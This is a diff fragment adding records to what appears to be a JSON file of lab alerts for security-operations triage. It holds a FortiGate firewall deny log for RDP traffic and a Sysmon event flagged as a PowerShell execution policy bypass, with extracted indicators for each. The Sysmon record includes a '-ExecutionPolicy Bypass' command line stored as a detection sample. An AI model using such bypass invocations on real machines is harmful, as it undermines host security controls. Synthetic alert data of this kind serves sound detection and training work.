+    "raw_log": "date=2024-12-24 time=19:45:29 devname=\"FGT-01\" devid=\"FG100FTK19000001\" logid=\"0000000011\" type=\"traffic\" subtype=\"forward\" level=\"warning\" srcip=10.10.20.13 srcport=57244 srcintf=\"lan\" dstip=10.10.50.10 dstport=3389 dstintf=\"dmz\" proto=6 action=\"deny\" policyid=99 service=\"tcp\" dstcountry=\"Reserved\" sentbyte=0 rcvdbyte=0",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.13",
+        "source": "srcip"
+      },
+      {
+        "type": "ip",
+        "value": "10.10.50.10",
+        "source": "dstip"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-042",
+    "alert_name": "PowerShell Execution Policy Bypass",
+    "use_case_id": "UC-EDR-002",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T19:30:14.8820650Z'/><EventRecordID>91010</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS-12.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 19:30:14.882</Data><Data Name='ProcessGuid'>{a22e455e-6a1f-6767-1a03-000000000a00}</Data><Data Name='ProcessId'>7588</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>powershell.exe</Data><Data Name='CommandLine'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\cleanup.ps1</Data><Data Name='CurrentDirectory'>C:\\Users\\Public\\</Data><Data Name='User'>CORP\\it.support</Data><Data Name='LogonGuid'>{6a1f6767-1a03-0000-0000-000000000000}</Data><Data Name='LogonId'>0x3E7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=53DADC40BB276161FBB4864750877D9641EBE8A5DEE5CE338D2554171EEBC6D1</Data><Data Name='ParentProcessGuid'>{6a1f6767-1a03-6767-0000-000000000b00}</Data><Data Name='ParentProcessId'>1251</Data><Data Name='ParentImage'>C:\\Windows\\System32\\svchost.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule</Data><Data Name='ParentUser'>CORP\\it.support</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "WS-12.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "user",
+        "value": "CORP\\it.support",
+        "source": "User"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "source": "Image"
+      }
     ]
   }
 ]
-
